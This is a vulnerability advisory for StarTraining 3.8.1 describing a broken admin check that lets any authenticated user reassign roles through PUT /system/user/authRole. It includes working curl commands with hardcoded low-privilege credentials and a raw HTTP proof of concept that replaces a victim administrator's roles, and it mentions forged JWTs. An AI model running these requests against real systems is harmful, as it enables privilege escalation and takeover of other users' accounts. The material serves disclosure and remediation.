# StarTraining — Broken data-scope check enables arbitrary role reassignment (IDOR) (ST-VULN-004)

| Field | Value |
|-------|-------|
| Vendor | zhistaredu |
| Product | StarTraining |
| Version | 3.8.1 |
| Type | Improper Authorization |
| CWE | CWE-639 / CWE-862 |
| Authentication | Any authenticated user (low-priv token sufficient) |
| Severity | Critical |

## Summary

`SysUser.isAdmin(String userId)` returns true whenever userId != null, so `checkUserDataScope()` never restricts access. `PUT /system/user/authRole` reassigns roles for arbitrary userId.

## Root cause

Broken isAdmin() + missing @PreAuthorize on user role grant endpoint.

## Exploit / reproduction

Low-priv account: `wukong` / `admin123`, or a forged low-priv JWT.

```bash
TOK=$(curl -s -X POST 'http://127.0.0.1:8900/login' -H 'Content-Type: application/json' \
  -d '{"username":"wukong","password":"admin123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['token'])")

curl -s 'http://127.0.0.1:8900/system/user/fa36ec75-160a-47e4-8140-ef1e94c5d329' -H "Authorization: $TOK"

curl -s -X PUT 'http://127.0.0.1:8900/system/user/authRole' \
  -H "Authorization: $TOK" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'userId=fa36ec75-160a-47e4-8140-ef1e94c5d329&roleIds=0cd789a0-1187-4c62-901d-a2801794e27a'
```

Endpoints:

- `GET http://127.0.0.1:8900/system/user/fa36ec75-160a-47e4-8140-ef1e94c5d329`
- `PUT http://127.0.0.1:8900/system/user/authRole`


## PoC (Yakit)

```http
# Login low user wukong/admin123 or use forged JWT
PUT /system/user/authRole HTTP/1.1
Host: 127.0.0.1:8900
Authorization: LOW_USER_TOKEN
Content-Type: application/x-www-form-urlencoded
Connection: close

userId=fa36ec75-160a-47e4-8140-ef1e94c5d329&roleIds=0cd789a0-1187-4c62-901d-a2801794e27a
```

Expected: HTTP 200; victim admin roleIds replaced

## Screenshots

![authRole](./screenshots/ST-VULN-004-authRole.png)

## Impact

Horizontal/vertical privilege escalation within tenant.

## Remediation

Fix isAdmin to check real admin flag; enforce @PreAuthorize; validate roleIds scope.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/startraining_poc_verify.py`, `startraining_jwt_forge.py`
